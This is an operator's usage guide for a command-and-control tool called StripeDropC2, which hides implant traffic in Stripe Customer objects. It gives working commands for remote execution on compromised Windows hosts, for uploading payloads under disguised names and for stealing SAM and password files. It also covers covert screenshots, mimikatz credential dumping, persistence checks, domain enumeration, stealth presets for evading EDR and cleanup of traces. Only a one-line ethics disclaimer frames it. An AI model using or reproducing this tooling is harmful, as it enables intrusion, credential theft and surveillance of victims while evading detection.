# Usage Guide

Complete operational reference for StripeDropC2.

## Operator Console

### Starting the Console

```bash
python3 c2_operator.py
```

The console presents a prompt showing the currently selected implant:
```
[no implant] > # No implant selected
[abc123-xyz:C:\Users\Public] > # Implant selected, with remote working directory
```

### Help System

```bash
help # Display all available commands
```

## Session Management

### Listing Implants

```bash
implants
```

**Output Example:**
```
ID HOSTNAME OS LAST SEEN STATUS
---------------------------------------- --------------------- ---------- ------------ ------
DESKTOP-ABC123-a1b2c3d4 DESKTOP-ABC123 Win32NT 15s ago ACTIVE
LAPTOP-XYZ789-e5f6g7h8 LAPTOP-XYZ789 Win32NT 125s ago STALE
```

**Status Indicators:**
- `ACTIVE` - Heartbeat within last 60 seconds
- `STALE` - No heartbeat for 60+ seconds (implant may be offline/sleeping)

### Selecting an Implant

```bash
use <implant_id>
```

**Example:**
```bash
use DESKTOP-ABC123-a1b2c3d4
[+] Switched to implant: DESKTOP-ABC123-a1b2c3d4
```

**Tips:**
- Tab completion may work depending on your terminal
- Copy full ID from `implants` output
- Only one implant can be selected at a time

### Viewing Implant Details

```bash
info
```

**Output:**
```
Implant ID : DESKTOP-ABC123-a1b2c3d4
Hostname : DESKTOP-ABC123
OS : Win32NT
Last Seen : 8s ago
Status : ACTIVE
Remote CWD : C:\Users\Public
```

## Command Execution

### Basic Command Execution

All commands execute directly - no `exec` prefix needed:

```bash
whoami
hostname
ipconfig /all
systeminfo
net user
dir C:\
```

**Command Flow:**
1. Operator sends command
2. Task ID returned immediately: `[+] Tasked: cus_ABC123xyz`
3. Implant polls, sees pending task
4. Command executes on target
5. Result streams back to operator
6. Output displayed with formatting

### Working with Directories

The operator tracks your remote working directory automatically:

```bash
cd C:\Users\Public\Documents
dir # Lists current directory
cd .. # Go up one level
cd \Windows\System32 # Absolute path
```

**Your prompt updates to show current directory:**
```
[DESKTOP-ABC123-a1b2c3d4:C:\Users\Public\Documents] >
```

### PowerShell Commands

Execute PowerShell directly:

```bash
powershell Get-Process
powershell Get-Service | Where-Object {$_.Status -eq 'Running'}
powershell (Get-WmiObject Win32_OperatingSystem).Caption
```

**For multi-line PowerShell:**
```bash
powershell -Command "$procs = Get-Process; $procs | Where-Object {$_.CPU -gt 100}"
```

### Long-Running Commands

Some commands may take time. The operator waits with a timeout based on your stealth profile:

```
[+] Tasked: cus_ABC123xyz
<waiting for result...>
```

**Timeout Calculation:**
- LOW profile: ~12.5 seconds
- BALANCED: ~37.5 seconds
- HIGH: ~150 seconds
- PARANOID: ~750 seconds

If timeout occurs, check with `pending` command - the result may still arrive.

## File Operations

### Uploading Files

```bash
upload <local_path> <remote_path>
```

**Examples:**
```bash
upload /home/operator/payload.exe C:\Users\Public\update.exe
upload ./tools/mimikatz.exe C:\Windows\Temp\debug.exe
upload "C:\Local Files\data.zip" C:\ProgramData\cache.zip
```

**Features:**
- Automatic chunking for files > 10 KB
- Progress indicators for large files
- Integrity verification via hash
- Handles spaces in paths (use quotes)

**Upload Process:**
1. Local file read and chunked (490 bytes per chunk)
2. Chunks uploaded to Stripe in parallel
3. Implant downloads and reassembles
4. Hash verification
5. Write to remote path

**Upload Output:**
```
[*] Uploading: payload.exe (1.5 MB)
78% (1.2/1.5 MB)
[+] Upload complete: C:\Users\Public\update.exe
```

### Downloading Files

```bash
download <remote_path> [local_path]
```

**Examples:**
```bash
download C:\Users\victim\Documents\passwords.txt
download C:\Windows\System32\config\SAM ./loot/sam.dat
download "C:\Program Files\App\config.xml" config_backup.xml
```

**Features:**
- If no local path specified, saves to `./downloads/<filename>`
- Creates `downloads/` directory automatically
- Large file chunking (490 bytes per chunk)
- Progress indicators
- Hash verification

**Download Output:**
```
[*] Requesting download: C:\Users\victim\Documents\passwords.txt
100% (2.3/2.3 KB)
[+] Downloaded: ./downloads/passwords.txt
```

**Download Locations:**
```bash
# Default location (no path specified)
download C:\file.txt # Saves to: ./downloads/file.txt

# Relative path
download C:\file.txt ./loot/ # Saves to: ./loot/file.txt

# Absolute path
download C:\file.txt /tmp/file # Saves to: /tmp/file
```

## Screenshot Capture

### Taking Screenshots

```bash
screenshot
```

**Features:**
- Captures all monitors (multi-monitor support)
- JPEG format (~100-500 KB typical)
- Automatic filename with timestamp
- Base64 transfer encoding
- Auto-saves to `./screenshots/`

**Screenshot Process:**
1. Command sent to implant
2. GDI+ captures desktop bitmap
3. Converts to JPEG (quality 85)
4. Base64 encodes for transfer
5. Chunks sent via Stripe
6. Operator reassembles and saves

**Output:**
```bash
[+] Tasked: cus_ABC123xyz

Screenshot captured successfully
Timestamp: 2026-05-25 14:32:18
Resolution: 1920x1080
File size: 156 KB

[+] Screenshot saved: ./screenshots/DESKTOP-ABC123-a1b2c3d4_20260525_143218.jpg
```

**Viewing Screenshots:**
```bash
ls -lh screenshots/
open screenshots/DESKTOP-ABC123-a1b2c3d4_20260525_143218.jpg # macOS
xdg-open screenshots/... # Linux
start screenshots\... # Windows
```

## Configuration Management

### Viewing Current Configuration

```bash
config show
```

**Output:**
```
Current Configuration for DESKTOP-ABC123-a1b2c3d4:

Poll Interval:
Min: 5000 ms (5 seconds)
Max: 15000 ms (15 seconds)

Heartbeat Interval:
Min: 25 seconds
Max: 35 seconds

Profile: BALANCED (moderate stealth, fast response)

Detection Risk: MODERATE
Average Response Time: 10 seconds

Notes:
- Adjust polling if detection risk is too high
- Use 'config preset paranoid' for maximum stealth
- Changes take effect on next implant check-in
```

### Stealth Presets

Quickly switch between pre-configured profiles:

```bash
config preset low # Fast & aggressive
config preset balanced # Recommended default
config preset high # Stealthy, slower response
config preset paranoid # Maximum stealth, very slow
```

**Preset Comparison:**

| Preset | Poll Interval | Heartbeat | Response Time | Detection Risk |
|--------|---------------|-----------|---------------|----------------|
| low | 2-5s | 15-30s | ~3s | Very High |
| balanced | 5-15s | 25-35s | ~10s | Moderate |
| high | 30-60s | 120-180s | ~45s | Low |
| paranoid | 120-300s | 600-900s | ~210s | Very Low |

**When to Use Each:**
- **LOW**: Lab testing, CTFs, time-sensitive operations
- **BALANCED**: Most red team engagements, default for production
- **HIGH**: High-security environments, EDR-monitored networks
- **PARANOID**: Nation-state targets, maximum OpSec required

### Custom Timing Configuration

#### Adjust Poll Interval
```bash
config poll <min_ms> <max_ms>
```

**Examples:**
```bash
config poll 3000 8000 # 3-8 seconds (faster than balanced)
config poll 60000 120000 # 1-2 minutes (very stealthy)
config poll 10000 10000 # Fixed 10 seconds (no jitter)
```

**Guidelines:**
- Min must be ≥ 1000 ms (1 second)
- Max must be ≥ Min
- Use jitter (Max > Min) to avoid predictable patterns
- Lower = faster response, higher detection risk
- Higher = slower response, lower detection risk

#### Adjust Heartbeat Interval
```bash
config heartbeat <min_sec> <max_sec>
```

**Examples:**
```bash
config heartbeat 30 60 # 30-60 seconds
config heartbeat 300 600 # 5-10 minutes (very slow)
config heartbeat 20 20 # Fixed 20 seconds (no jitter)
```

**Guidelines:**
- Min must be ≥ 10 seconds
- Max must be ≥ Min
- Longer intervals = less network noise, but harder to detect dead implants
- Shorter intervals = more responsive status, but more network traffic

### Resetting Configuration

Return to compile-time defaults:

```bash
config reset
```

This clears operator-side overrides and lets implant use its built-in configuration.

## Maintenance & Debugging

### Viewing Pending Commands

Check what commands are waiting for execution:

```bash
pending
```

**Output:**
```
[~] cus_DEFabc123 [DESKTOP-ABC123-a1b2c3d4] → whoami
[~] cus_GHIxyz789 [DESKTOP-ABC123-a1b2c3d4] → dir C:\
```

**Status Tags:**
- `c2-pending` - Queued, not yet picked up by implant
- `c2-processing` - Currently executing
- `c2-done` - Completed (results available)

### Cleaning Up Stripe Objects

StripeDropC2 creates Customer objects for every command and result. Clean up regularly:

```bash
clear
```

**What It Does:**
1. Scans all Stripe Customer objects
2. Identifies non-heartbeat objects (commands, results, transfers)
3. Deletes them in parallel (fast)
4. Preserves heartbeat objects (implant tracking)

**Output:**
```
[*] Scanning for stale objects... found 47 object(s).
[] 47/47 (100.0%)
[+] Cleaned 47 object(s).
```

**When to Run:**
- After completed engagements
- When approaching Stripe object limits
- Before starting new operations
- Periodically during long engagements

**Best Practice:**
```bash
# Clean at end of session
clear

# Verify cleanup
implants # Should still show active implants
```

## Exiting

### Graceful Exit

```bash
exit
```

**What Happens:**
- Operator console closes
- No cleanup performed automatically
- Implants continue running and checking in
- Heartbeat objects remain in Stripe
- Can reconnect anytime with `python3 c2_operator.py`

**Before Exiting:**
- Save any important output
- Note implant IDs for reconnection
- Consider running `clear` to clean up
- Verify file downloads completed

### Emergency Exit

```bash
Ctrl+C
```

Interrupts current operation and exits. Less clean than `exit` but safe.

## Advanced Techniques

### Command Chaining

Execute multiple commands:

```bash
whoami && hostname && ipconfig /all
```

**PowerShell Multi-Command:**
```bash
powershell "Get-Process | Select-Object -First 10; Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -First 5"
```

### Output Redirection

```bash
dir C:\Users > C:\Temp\userlist.txt
download C:\Temp\userlist.txt
```

### Running Scripts

Upload and execute:
```bash
upload ./scripts/enum.bat C:\Temp\enum.bat
C:\Temp\enum.bat
download C:\Temp\enum_results.txt
```

**PowerShell Script:**
```bash
upload ./scripts/Get-DomainInfo.ps1 C:\Temp\script.ps1
powershell -ExecutionPolicy Bypass -File C:\Temp\script.ps1
```

### Persistence Verification

Check if persistence mechanisms installed:

```bash
# Registry Run key
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsSecurityUpdate

# Startup folder
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

# Scheduled task
schtasks /query /tn EdgeUpdateTask
```

### Credential Harvesting

```bash
# Upload mimikatz
upload ./tools/mimikatz.exe C:\Windows\Temp\debug.exe

# Dump credentials (requires admin)
C:\Windows\Temp\debug.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Clean up
del C:\Windows\Temp\debug.exe
```

### Network Enumeration

```bash
# Local network
ipconfig /all
arp -a
netstat -ano

# Domain info
net user /domain
net group "Domain Admins" /domain
nltest /dclist:

# Shares
net view \\fileserver
net use \\fileserver\share
dir \\fileserver\share
```

## Monitoring & Logging

### Stripe Dashboard Monitoring

Monitor C2 activity via Stripe dashboard:
```
https://dashboard.stripe.com/test/customers
```

**What to Look For:**
- Customer count (should correlate with commands)
- Metadata patterns (tags, implant IDs)
- Creation timestamps (timing patterns)
- Object names (heartbeat-, implant IDs)

### Local Logging

The operator console doesn't log by default. Capture output:

```bash
# Log all console output
python3 c2_operator.py 2>&1 | tee operation_log.txt

# Or use script command
script -c "python3 c2_operator.py" session.log
```

### Screenshot Archive

```bash
ls -lh screenshots/
du -sh screenshots/ # Total size

# Organize by date
ls screenshots/ | grep 20260525

# Find recent screenshots
find screenshots/ -mtime -1 # Last 24 hours
```

## Troubleshooting Common Issues

### "No active implants" after deploy

**Checklist:**
1. Wait 30-60 seconds for initial heartbeat
2. Verify implant process running: `tasklist | findstr stripe`
3. Check internet connectivity on target
4. Verify firewall allows HTTPS outbound
5. Check Stripe dashboard for heartbeat objects

### Commands timeout

**Solutions:**
1. Check current profile: `config show`
2. Switch to faster preset: `config preset balanced`
3. Verify implant is still active: `info`
4. Check for high network latency

### File upload fails

**Debugging:**
1. Verify local file exists and is readable
2. Check remote path is valid and writable
3. Ensure enough disk space on target
4. Try smaller file first to test connectivity
5. Check Stripe rate limits (too many chunks)

### Screenshot command hangs

**Possible Causes:**
- Locked workstation (no active desktop session)
- Remote Desktop session (RDP may block GDI+)
- Insufficient memory for large displays
- Anti-screenshot detection blocking capture

**Workaround:**
```bash
# Try again after user logs in
screenshot

# Or check active sessions first
query user
```

## Quick Reference

### Most Common Commands
```bash
implants # List all implants
use <id> # Select implant
info # Show implant details
whoami # Check current user
hostname # Get system name
ipconfig # Network info
dir # List directory
upload <src> <dst> # Send file
download <src> [dst] # Retrieve file
screenshot # Capture screen
config preset balanced # Set stealth level
pending # Show queued tasks
clear # Clean up objects
exit # Quit operator
```

### Keyboard Shortcuts
- `Ctrl+C`: Interrupt/exit
- `Ctrl+D`: EOF/exit (Unix)
- `Up/Down`: Command history (terminal-dependent)
- `Tab`: Auto-complete (limited support)

---

**Remember: With great access comes great responsibility. Use StripeDropC2 ethically and legally.**
